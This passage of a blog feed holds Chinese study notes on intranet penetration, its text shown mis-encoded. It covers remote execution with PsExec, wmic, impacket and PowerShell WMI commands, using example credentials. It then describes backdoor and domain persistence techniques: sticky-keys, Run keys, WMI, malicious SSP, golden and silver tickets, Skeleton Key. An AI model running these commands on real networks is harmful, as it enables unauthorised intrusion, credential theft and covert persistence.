class="hljs-selector-pseudo">::ptt</span> <span class="hljs-selector-tag">PATH</span><br></code></pre></td></tr></table></figure></li></ol><p><strong>æ³¨æ„</strong></p><ul><li>ç¥¨æ®æ–‡ä»¶æ³¨å…¥å†…å­˜çš„é»˜è®¤æœ‰æ•ˆæ—¶é—´æ˜¯10å°æ—¶</li><li>åœ¨ç›®æ ‡æœºå™¨ä¸Šä¸éœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™å°±å¯ä»¥è¿›è¡Œç¥¨æ®ä¼ é€’</li></ul><h5 id="PsExecä½¿ç”¨"><a href="#PsExecä½¿ç”¨" class="headerlink" title="PsExecä½¿ç”¨"></a>PsExecä½¿ç”¨</h5><p><code>PsExec</code>è¿è¡Œçš„åŸºæœ¬åŸç†æ˜¯ï¼šé€šè¿‡ç®¡é“åœ¨è¿œç¨‹ç›®æ ‡æœºå™¨ä¸Šåˆ›å»ºä¸€ä¸ªpsexecæœåŠ¡ï¼Œå¹¶åœ¨æœ¬åœ°ç£ç›˜ä¸­ç”Ÿæˆä¸€ä¸ªåä¸º<code>PSEXECSVC</code>çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åé€šè¿‡<code>psexec</code>æœåŠ¡è¿è¡Œå‘½ä»¤ï¼Œè¿è¡Œç»“æŸååˆ é™¤æœåŠ¡</p><ol><li><p>å·²ç»å»ºç«‹äº†<code>ipc$</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">PsExec</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-accepteula</span> \\192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.17</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">-accepteula</span> ä½¿ç”¨è¯¥å‚æ•°å°±ä¸ä¼šå¼¹å‡ºç¡®è®¤æ¡†<br><span class="hljs-selector-tag">-s</span> ä»¥<span class="hljs-selector-tag">System</span>æƒé™è·å–äº¤äº’å¼çš„<span class="hljs-selector-tag">shell</span>ï¼Œå¦‚æœä¸åŠ å°±ä¼šè·å¾—ä¸€ä¸ª<span class="hljs-selector-tag">Administrator</span>çš„<span class="hljs-selector-tag">shell</span><br></code></pre></td></tr></table></figure></li><li><p>æœªå»ºç«‹<code>ipc$</code></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">PsExec.exe \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> -u administrator -p password cmd.exe<br><br>PsExec.exe \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> -u administrator -p password cmd.exe /c <span class="hljs-string">&quot;ipconfig&quot;</span> æ‰§è¡Œå‘½ä»¤<br></code></pre></td></tr></table></figure></li></ol><p><strong>æ³¨æ„</strong></p><ul><li>è¿œç¨‹ç³»ç»Ÿé»˜è®¤å¼€å¯<code>admin$</code>å…±äº«ï¼ˆé»˜è®¤æ˜¯å¼€å¯çš„ï¼‰</li><li>ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šç•™ä¸‹å¤§é‡æ—¥å¿—éœ€è¦æ³¨æ„</li><li>MSFä¹Ÿæœ‰PsExecçš„ç›¸åº”æ¨¡å—æä¾›ä½¿ç”¨</li></ul><h5 id="WMIçš„ä½¿ç”¨"><a href="#WMIçš„ä½¿ç”¨" class="headerlink" title="WMIçš„ä½¿ç”¨"></a>WMIçš„ä½¿ç”¨</h5><p><code>WMI(Windows Management Instrumentation)</code>ï¼Œå®ƒæ˜¯ç”±ä¸€ç³»åˆ—å·¥å…·é›†ç»„æˆçš„ï¼Œå¯ä»¥ä»æœ¬åœ°æˆ–è€…è¿œç¨‹ç®¡ç†è®¡ç®—æœºç³»ç»Ÿï¼Œä»Windows 98å¼€å§‹ï¼Œwindowsæ“ä½œç³»ç»Ÿéƒ½æ”¯æŒWMIã€‚WMIçš„æ“ä½œé»˜è®¤ä¸ä¼šäº§ç”Ÿæ—¥å¿—ã€‚</p><p><strong>åŸºæœ¬å‘½ä»¤</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic /node:192.168.1.17 /user:administrator /password:PassWord process call create <span class="hljs-string">&quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span>  å°†æ‰§è¡Œç»“æœä¿å­˜åœ¨Cç›˜ä¸­<br><br>type \\192.168.1.17\C$\ip.txt  å»ºç«‹ipc$åï¼Œä½¿ç”¨typeå‘½ä»¤è¯»å–ç»“æœ<br></code></pre></td></tr></table></figure><p>wmicæ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œåœ¨è¿œç¨‹ç³»ç»Ÿä¸­å¯åŠ¨WMIæœåŠ¡ï¼ˆæœåŠ¡ç«¯å£ä¸º135ç«¯å£ï¼Œwmicä¼šä»¥ç®¡ç†å‘˜æƒé™åœ¨è¿œç¨‹ç³»ç»Ÿä¸­æ‰§è¡Œå‘½ä»¤ï¼‰ã€‚å¦‚æœç›®æ ‡ç³»ç»Ÿæœ‰é˜²ç«å¢™å°±æ— æ³•è¿æ¥ï¼Œwmicå°±æ— æ³•è¿æ¥ï¼Œwmicå‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦ä½¿ç”¨<code>ipc$</code>å’Œtypeå‘½ä»¤æ¥è¯»å–ä¿¡æ¯ï¼Œå¦‚æœwmicæ‰§è¡Œçš„æ˜¯æ¶æ„ç¨‹åºä¹Ÿä¸ä¼šç•™ä¸‹æ—¥å¿—ã€‚</p><p><strong>impacketå·¥å…·åŒ…ä¸­çš„wmiexecc</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wmiexec.py administrator:<span class="hljs-symbol">Password@</span><span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span><br></code></pre></td></tr></table></figure><p>ä¸»è¦ç”¨äºLinuxç›¸å…³</p><p><strong>wmiexec.vbs</strong></p><p><code>wmiexec.vbs</code>è„šæœ¬æ˜¯é€šè¿‡VBSè°ƒç”¨WMIæ¥æ¨¡æ‹ŸPsExecçš„åŠŸèƒ½ï¼Œå¯ä»¥åœ¨è¿œç¨‹ç³»ç»Ÿä¸­æ‰§è¡Œå‘½ä»¤å¹¶è¿›è¡Œå›æ˜¾ï¼Œè·å¾—åŠäº¤äº’å¼shell</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">cscript.exe</span> <span class="hljs-string">//nologo</span> <span class="hljs-string">wmiexec.vbs</span> <span class="hljs-string">/shell</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> <span class="hljs-string">administrator</span> <span class="hljs-string">PassWord</span> <span class="hljs-comment"># å»ºç«‹åŠäº¤äº’å¼shell</span><br><span class="hljs-string">cscript.exe</span> <span class="hljs-string">wmiexec.vbs</span> <span class="hljs-string">/cmd</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> <span class="hljs-string">administrator</span> <span class="hljs-string">PassWord</span> <span class="hljs-string">&quot;ipconfig&quot;</span> <span class="hljs-comment"># æ‰§è¡Œå•æ¡å‘½ä»¤</span><br></code></pre></td></tr></table></figure><p>å¯¹äºä¸€äº›è¿è¡Œæ—¶é—´è¾ƒé•¿çš„å‘½ä»¤ï¼Œéœ€è¦æ·»åŠ <code>-wait 5000</code> æˆ–è€…æ›´é•¿çš„æ—¶é—´å‚æ•°ï¼›åœ¨è¿è¡Œncè¿™ç§ä¸éœ€è¦è¾“å‡ºç»“æœä½†æ˜¯éœ€è¦ä¸€ç›´è¿è¡Œçš„å‘½ä»¤æ—¶ï¼Œä½¿ç”¨<code>-persist</code>å‚æ•°ï¼Œå°±ä¸éœ€è¦ä½¿ç”¨<code>taskkill</code>å‘½ä»¤æ¥è¿œç¨‹ç»“æŸè¿›ç¨‹</p><blockquote><p>å·²ç»è¢«è®¸å¤šæ€è½¯åˆ—å…¥é»‘åå•</p></blockquote><p><strong>Invoke-WmiCommand</strong></p><p><code>Invoke-WmiCommand.ps1</code>è„šæœ¬åŒ…å«åœ¨<code>PowerSploit</code>å·¥å…·åŒ…ä¸­ï¼Œå®ƒé€šè¿‡<code>Powershell</code>è°ƒç”¨WMIæ¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># ç›®æ ‡ç³»ç»Ÿç”¨æˆ·å</span><br>$User=<span class="hljs-string">&quot;lcdm123\administrator&quot;</span><br><span class="hljs-comment"># ç›®æ ‡ç³»ç»Ÿå¯†ç </span><br>$Password= ConvertTo-SecureString -<span class="hljs-keyword">String</span> <span class="hljs-string">&quot;Password&quot;</span> -AsPlainText -Force<br><span class="hljs-comment"># å°†è´¦å·å’Œå¯†ç æ•´åˆèµ·æ¥</span><br>$Cred= <span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password<br><span class="hljs-comment"># è¿œç¨‹æ‰§è¡Œå‘½ä»¤</span><br>$Remote=Invoke-WmiComand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span><br><span class="hljs-comment"># å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°å±å¹•</span><br>$Remote.PayloadOutput<br></code></pre></td></tr></table></figure><p><strong>Invoke-WMIMethod</strong></p><p>åˆ©ç”¨<code>Powershell</code>è‡ªå¸¦çš„<code>Invoke-WMIMethod</code>å¯ä»¥åœ¨è¿œç¨‹æ‰§è¡Œå‘½ä»¤å’ŒæŒ‡å®šç¨‹åºï¼Œåœ¨Powershellå‘½ä»¤è¡Œç¯å¢ƒä¸­æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¯ä»¥ä»¥éäº¤äº’å¼çš„æ–¹æ³•æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ä¸ä¼šå›æ˜¾ç»“æœ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># ç›®æ ‡ç³»ç»Ÿç”¨æˆ·å</span><br><span class="hljs-variable">$User</span>=<span class="hljs-string">&quot;lcdm123\administrator&quot;</span><br><span class="hljs-comment"># ç›®æ ‡ç³»ç»Ÿå¯†ç </span><br><span class="hljs-variable">$Password</span>= <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;Password&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-comment"># å°†è´¦å·å’Œå¯†ç æ•´åˆèµ·æ¥</span><br><span class="hljs-variable">$Cred</span>= <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><span class="hljs-comment"># åœ¨è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œè®¡ç®—æœºç¨‹åº</span><br><span class="hljs-built_in">Invoke-WMIMethod</span> <span class="hljs-literal">-Class</span> Win32_Process <span class="hljs-literal">-Name</span> Create <span class="hljs-literal">-ArgumenList</span> <span class="hljs-string">&quot;cacl.exe&quot;</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;192.168.1.17&quot;</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span><br></code></pre></td></tr></table></figure><h5 id="smbexecä½¿ç”¨"><a href="#smbexecä½¿ç”¨" class="headerlink" title="smbexecä½¿ç”¨"></a>smbexecä½¿ç”¨</h5><blockquote><p>ä½¿ç”¨smbexecæ—¶ç›®æ ‡ç³»ç»Ÿçš„å…±äº«å¿…é¡»å¼€æ”¾ï¼ˆC$  ipc$ admin$ï¼‰</p></blockquote><p><strong>C++ç‰ˆçš„smbexec</strong></p><p>test.exe å®¢æˆ·ç«¯ä¸»ç¨‹åº</p><p>execserver.exe ç›®æ ‡ç³»ç»Ÿä¸­çš„è¾…åŠ©ç¨‹åº</p><p>å¸¸ç”¨å‘½ä»¤<code>test.exe ip username password  command netshare</code></p><p>ä½¿ç”¨</p><ul><li><p>å°†exeserver.exeä¸Šä¼ åˆ°ç›®æ ‡ç³»ç»Ÿçš„C:\Windowsç›®å½•ä¸‹ï¼Œè§£é™¤UACå¯¹å‘½ä»¤æ‰§è¡Œçš„é™åˆ¶</p><p><code>net use \\192.168.1.17 &quot;Password&quot; /user:lcdm123\administrator</code></p></li><li><p>åœ¨å®¢æˆ·ç«¯æ‰§è¡Œ</p><p><code>test.exe 192.168.1.17 administrator Password whoami c$</code></p></li></ul><p><strong>impacketå·¥å…·åŒ…ä¸­çš„smbexec.py</strong></p><p><code>smbexec.py lcdm123/administrator:password@192.168.1.17</code></p><p><strong>DCOMåœ¨è¿œç¨‹ç³»ç»Ÿä¸­çš„ä½¿ç”¨</strong></p><blockquote><p>DCOMï¼ˆåˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼‰æ—¶å¾®è½¯çš„ä¸€ç³»åˆ—æ¦‚å¿µå’Œç¨‹åºæ¥å£ï¼Œé€šè¿‡DCOMå®¢æˆ·ç«¯ç¨‹åºå¯¹è±¡èƒ½å¤Ÿå‘ç½‘ç»œä¸­çš„å¦ä¸€å°è®¡ç®—æœºä¸Šçš„æœåŠ¡ç¨‹åºå¯¹è±¡å‘é€è¯·æ±‚</p><p>DCOMæ˜¯åŸºäºç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼ˆCOMï¼‰çš„ï¼ŒCOMæä¾›äº†ä¸€å¥—å…è®¸åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œé€šä¿¡çš„æ¥å£</p></blockquote><h4 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h4><h5 id="æ“ä½œç³»ç»Ÿåé—¨"><a href="#æ“ä½œç³»ç»Ÿåé—¨" class="headerlink" title="æ“ä½œç³»ç»Ÿåé—¨"></a>æ“ä½œç³»ç»Ÿåé—¨</h5><ul><li><p>ç²˜æ»å»ºåé—¨</p><p>ä½¿ç”¨åé—¨ç¨‹åºæ›¿æ¢<code>windows\system32</code>ä¸‹çš„<code>sethc.exe</code>æ–‡ä»¶</p></li><li><p>æ³¨å†Œè¡¨åé—¨</p><p>åœ¨æ™®é€šç”¨æˆ·æƒé™ä¸‹ï¼Œæ”»å‡»è€…å°†éœ€è¦æ‰§è¡Œçš„åé—¨ç¨‹åºæˆ–è€…è€Œè„šæœ¬è·¯å¾„å¡«å†™åˆ°æ³¨å†Œè¡¨é”®<code>HACK:Software\Microsoft\Windows\CurrentVersion\Run</code>ä¸­ï¼ˆé”®åä»»æ„ï¼‰</p></li><li><p>è®¡åˆ’ä»»åŠ¡åé—¨</p><ul><li>MSFä¸­æ¨¡æ‹Ÿè®¡åˆ’ä»»åŠ¡åé—¨</li><li>PowerShellä¸­æ¨¡æ‹Ÿè®¡åˆ’ä»»åŠ¡åé—¨</li><li>Empireä¸­æ¨¡æ‹Ÿè®¡åˆ’ä»»åŠ¡åé—¨</li></ul></li><li><p>meterpreteråé—¨</p><p>persistenceæ˜¯meterpreterè‡ªå¸¦çš„åé—¨ç¨‹åºï¼Œæ˜¯ä¸€ä¸ªä½¿ç”¨å®‰è£…è‡ªå¯åŠ¨æ–¹å¼çš„æŒä¹…æ€§åé—¨ç¨‹åº</p></li><li><p>Cymothoaåé—¨</p><p>Cymothoaæ˜¯ä¸€æ¬¾å¯ä»¥å°†shellcodeæ³¨å…¥å…ˆåè¿›ç¨‹ï¼ˆæ’è¿›ç¨‹ï¼‰çš„åé—¨å·¥å…·</p></li><li><p>WMIå‹åé—¨</p><p>WMIå‹åé—¨åªèƒ½ç”±å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·è¿è¡Œï¼ŒWMIå‹åé—¨é€šå¸¸æ˜¯ç”±Powershellç¼–å†™çš„ï¼Œå¯ä»¥ç›´æ¥ä»æ–°çš„WMIå±æ€§ä¸­è¯»å–å’Œæ‰§è¡Œåé—¨ä»£ç ï¼Œç»™ä»£ç åŠ å¯†ï¼Œé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç³»ç»Ÿä¸­å®‰è£…ä¸€ä¸ªå…·æœ‰æŒä¹…æ€§çš„åé—¨å¹¶ä¸”ä¸ä¼šå†ç³»ç»Ÿç£ç›˜ä¸­ç•™ä¸‹ä»»ä½•æ–‡ä»¶</p><p>WMIå‹åé—¨ä½¿ç”¨äº†WMIçš„ä¸¤ä¸ªç‰¹å¾ï¼šæ— æ–‡ä»¶å’Œæ— è¿›ç¨‹ï¼ŒåŸºæœ¬åŸç†æ˜¯å°†ä»£ç åŠ å¯†å­˜å‚¨å†WMIä¸­ï¼Œè¾¾åˆ°æ‰€è°“çš„æ— æ–‡ä»¶ï¼›å½“è®¾å®šçš„æ¡ä»¶è¢«æ»¡è¶³æ—¶ç³»ç»Ÿå°†å¯åŠ¨Powershellè¿›ç¨‹å»æ‰§è¡Œåé—¨ç¨‹åºï¼Œæ‰§è¡Œåè¿›ç¨‹å°†æ¶ˆå¤±ï¼ˆæ—¶é—´æ ¹æ®åé—¨çš„è¿è¡Œæƒ…å†µè€Œå®šï¼‰è¾¾åˆ°æ‰€è°“çš„æ— è¿›ç¨‹</p></li></ul><h5 id="Webåé—¨"><a href="#Webåé—¨" class="headerlink" title="Webåé—¨"></a>Webåé—¨</h5><blockquote><p>è¿™ä¸ªæ„Ÿè§‰å°±æ˜¯æ¯”å¹³æ—¶ä¸€å¥è¯æœ¨é©¬å·®ä¸å¤šçš„åé—¨</p></blockquote><ul><li>Nishangä¸‹çš„webshell</li><li>weevelyåé—¨</li><li>webacooåé—¨</li><li>MSFä¸­çš„ASPXï¼ŒPHPåé—¨</li><li>â€¦â€¦â€¦â€¦â€¦â€¦</li></ul><h5 id="åŸŸæ§åˆ¶å™¨æƒé™æŒä¹…åŒ–"><a href="#åŸŸæ§åˆ¶å™¨æƒé™æŒä¹…åŒ–" class="headerlink" title="åŸŸæ§åˆ¶å™¨æƒé™æŒä¹…åŒ–"></a>åŸŸæ§åˆ¶å™¨æƒé™æŒä¹…åŒ–</h5><ul><li><p>DSRMåŸŸåé—¨</p><p>DSRMï¼ˆç›®å½•æœåŠ¡æ¢å¤æ¨¡å¼ï¼‰æ˜¯WindowsåŸŸç¯å¢ƒä¸­åŸŸæ§åˆ¶å™¨çš„å®‰å…¨æ¨¡å¼å¯åŠ¨é€‰é¡¹ã€‚æ¯ä¸ªåŸŸæ§åˆ¶å™¨éƒ½æœ‰ä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ï¼ˆDSRMè´¦æˆ·ï¼‰</p><p>DSRMçš„ç”¨é€”ï¼šå…è®¸ç®¡ç†å‘˜å†åŸŸç¯å¢ƒä¸­å‡ºç°æ•…éšœæˆ–å´©æºƒæ—¶è¿˜åŸï¼Œä¿®å¤ï¼Œé‡å»ºæ´»åŠ¨ç›®å½•æ•°æ®åº“</p><p>æ¸—é€æµ‹è¯•ä¸­å¯ä»¥ä½¿ç”¨DSRMè´¦æˆ·å¯¹åŸŸç¯å¢ƒè¿›è¡ŒæŒä¹…åŒ–æ“ä½œï¼Œå¦‚æœåŸŸæ§ç‰ˆæœ¬ä¸ºwin server 2008 éœ€è¦å®‰è£…KB961320æ‰å¯ä»¥ä½¿ç”¨æŒ‡å®šåŸŸè´¦æˆ·çš„å¯†ç å¯¹DSRMè¿›è¡ŒåŒæ­¥ï¼Œå†ä¹‹åçš„ç‰ˆæœ¬ä¸éœ€è¦å®‰è£…ï¼Œå¦‚æœæ˜¯Windows server 2003åˆ™ä¸èƒ½ä½¿ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡ŒæŒä¹…åŒ–</p></li><li><p>SSPç»´æŒåŸŸæ§æƒé™</p><p>ç®€å•SSPå°±æ˜¯ä¸€ä¸ªDLLæ–‡ä»¶ï¼Œä¸»è¦ç”¨æ¥å®ç°Windowsæ“ä½œç³»ç»Ÿçš„èº«ä»½è®¤è¯åŠŸèƒ½ï¼Œä¾‹å¦‚NTLMï¼Œkerberosç­‰</p><p>SSPIï¼ˆå®‰å…¨æ”¯æŒæä¾›ç¨‹åºæ¥å£ï¼‰æ˜¯windowsæ“ä½œç³»ç»Ÿåœ¨æ‰§è¡Œæ“ä½œæ—¶ä½¿ç”¨çš„APIæ¥å£ï¼Œå¯ä»¥è¯´SSPIæ˜¯SSPçš„APIæ¥å£</p><p>SSPæŒä¹…åŒ–æ“ä½œçš„åŸç†ï¼šLSAç”¨äºèº«ä»½éªŒè¯ï¼›lsass.exeä½œä¸ºwindowsçš„ç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»å½•ç­–ç•¥ï¼Œåœ¨å¯åŠ¨æ—¶ï¼ŒSSPå°†è¢«åŠ è½½åˆ°lsass.exeè¿›ç¨‹ä¸­ï¼Œä½†æ˜¯å‡å¦‚æ”»å‡»è€…å¯¹LSAè¿›è¡Œäº†æ‰©å±•ï¼Œè‡ªå®šä¹‰äº†æ¶æ„çš„DLLæ–‡ä»¶ï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å°†å…¶åŠ è½½åˆ°lsass.exeè¿›ç¨‹ä¸­ï¼Œå°±å¯ä»¥è·å¾—lsass.exeè¿›ç¨‹ä¸­çš„æ˜æ–‡å¯†ç ï¼Œè¿™æ ·å³ä½¿ç”¨æˆ·æ›´æ”¹å¯†ç å¹¶é‡æ–°ç™»å½•ï¼Œæ”»å‡»è€…ä¾ç„¶èƒ½è·å–åˆ°æ˜æ–‡å¯†ç ã€‚</p></li><li><p>SID HistoryåŸŸåé—¨</p><p>æ¯ä¸ªç”¨æˆ·éƒ½æœ‰è‡ªå·±çš„SIDï¼ŒSIDçš„ä½œç”¨å°±æ˜¯è·Ÿè¸ªå®‰å…¨ä¸»ä½“æ§åˆ¶ç”¨æˆ·è¿æ¥èµ„æºæ—¶çš„è®¿é—®æƒé™ï¼ŒSID Historyæ˜¯åŸŸè¿ç§»è¿‡ç¨‹ä¸­éœ€è¦ä½¿ç”¨çš„ä¸€ä¸ªå±æ€§ã€‚</p><p><strong>SID Historyçš„ä½œç”¨å°±æ˜¯åœ¨åŸŸè¿ç§»çš„è¿‡ç¨‹ä¸­ä¿æŒåŸŸç”¨æˆ·çš„è®¿é—®æƒé™</strong>ï¼Œå³å¦‚æœé’±ä»¥åç”¨æˆ·çš„SIDæ”¹å˜äº†ï¼Œç³»ç»Ÿå°†å…¶åŸæ¥çš„SIDæ·»åŠ åˆ°é’±ä»¥åç”¨æˆ·çš„SID Historyä¸­ï¼Œä½¿è¿ç§»åçš„ç”¨æˆ·ä¿æŒåŸæœ‰çš„æƒé™ï¼Œèƒ½å¤Ÿè®¿é—®åŸæ¥å¯ä»¥è®¿é—®çš„èµ„æºã€‚</p></li><li><p>é»„é‡‘ç¥¨æ®</p><p>å‡è®¾åŸŸå†…å­˜åœ¨ä¸€ä¸ªSIDä¸º502çš„åŸŸè´¦æˆ·ä¸ºkrbtgtï¼Œå®ƒæ˜¯KDCæœåŠ¡ä½¿ç”¨çš„è´¦æˆ·ï¼Œå±äºDomain Adminsç»„ï¼ŒåŸŸç¯å¢ƒä¸­ï¼Œæ¯ä¸ªç”¨æˆ·è´¦æˆ·çš„ç¥¨æ®éƒ½æ˜¯ç”±krbtgtç”Ÿæˆçš„ï¼Œå¦‚æœæ‹¿åˆ°äº†krbtgtçš„NTLM Hash æˆ–è€… AES-256å€¼å°±å¯ä»¥ä¼ªé€ åŸŸå†…ä»»æ„ç”¨æˆ·çš„èº«ä»½è®¿é—®å…¶ä»–æœåŠ¡</p><p>ä½¿ç”¨é»„é‡‘ç¥¨æ®è¿›è¡Œç¥¨æ®ä¼ é€’æ”»å‡»æ—¶éœ€è¦çš„ä¿¡æ¯ï¼š</p><ul><li>å®Œæ•´çš„åŸŸå</li><li>åŸŸSID</li><li>krbtgtçš„NTLM Hash æˆ– AES-256å€¼</li><li>éœ€è¦ä¼ªé€ çš„åŸŸç®¡ç†å‘˜ç”¨æˆ·å</li></ul></li><li><p>ç™½é“¶ç¥¨æ®</p><p>ä¸åŒäºé»„é‡‘ç¥¨æ®ï¼Œç™½é“¶ç¥¨æ®çš„åˆ©ç”¨è¿‡ç¨‹æ˜¯ä¼ªé€ TGSï¼Œé€šè¿‡å·²çŸ¥çš„æˆæƒæœåŠ¡å¯†ç ç”Ÿæˆä¸€å¼ å¯ä»¥è®¿é—®æœåŠ¡çš„TGTï¼Œå› ä¸ºç¥¨æ®ç”Ÿæˆçš„è¿‡ç¨‹ä¸­ä¸ä¼šä½¿ç”¨æ‰€ä»¥å¯ä»¥ç»•è¿‡åŸŸæ§ï¼Œå¾ˆå°‘ç•™ä¸‹æ—¥å¿—ã€‚ç™½é“¶ç¥¨æ®ä¾èµ–äºæœåŠ¡è´¦æˆ·çš„å¯†ç æ•£åˆ—å€¼ï¼Œé€šè¿‡ç›¸åº”çš„æœåŠ¡è´¦å·æ¥ä¼ªé€ TGSï¼Œä¾‹å¦‚ LDAPï¼ŒMSSQLï¼ŒDNSç­‰ï¼ŒèŒƒå›´æœ‰é™åªèƒ½è·å–å¯¹åº”æœåŠ¡çš„æƒé™ã€‚</p><p>é»„é‡‘ç¥¨æ®æ˜¯ç”±krbtgtè´¦å·åŠ å¯†çš„ï¼Œç™½é“¶ç¥¨æ®æ˜¯ç”±ç‰¹å®šçš„æœåŠ¡è´¦å·åŠ å¯†çš„</p><p>ç™½é“¶ç¥¨æ®æ”»å‡»æ—¶éœ€è¦çš„ä¿¡æ¯ï¼š</p><ul><li>åŸŸå</li><li>åŸŸSID</li><li>ç›®æ ‡æœåŠ¡å™¨çš„FQDN</li><li>å¯åˆ©ç”¨çš„æœåŠ¡</li><li>æœåŠ¡è´¦æˆ·çš„NTLM Hash</li><li>éœ€è¦ä¼ªé€ çš„ç”¨æˆ·å</li></ul></li><li><p>Skeleton Key</p><p>ä½¿ç”¨Skeleton Key ï¼ˆä¸‡èƒ½å¯†ç ï¼‰ï¼Œå¯ä»¥å¯¹åŸŸå†…æƒé™è¿›è¡ŒæŒä¹…åŒ–æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨mimikatzå’ŒEmoireçš„æ“ä½œå°†Skeleton Keyæ³¨å…¥lsass.exeä¸­</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;çŸ¥è¯†ç‚¹æ¢³ç†-amp-å¤ç°&quot;&gt;&lt;a href=&quot;#çŸ¥è¯†ç‚¹æ¢³ç†-amp-å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;çŸ¥è¯†ç‚¹æ¢³ç† &amp;amp; å¤ç°&quot;&gt;&lt;/a&gt;çŸ¥è¯†ç‚¹æ¢³ç† &amp;amp; å¤ç°&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;è¦æ±‚ï¼šå†™æ¸…æ¥šå„ä¸ªçŸ¥è¯†ç‚¹ï¼Œç¯</summary>
      
    
    
    
    <category term="å†…ç½‘" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Javaåå°„</title>
    <link href="http://example.com/2021/10/12/Java%E5%8F%8D%E5%B0%84/"/>
    <id>http://example.com/2021/10/12/Java%E5%8F%8D%E5%B0%84/</id>
    <published>2021-10-12T07:55:12.000Z</published>
    <updated>2021-10-12T07:56:36.027Z</updated>
    
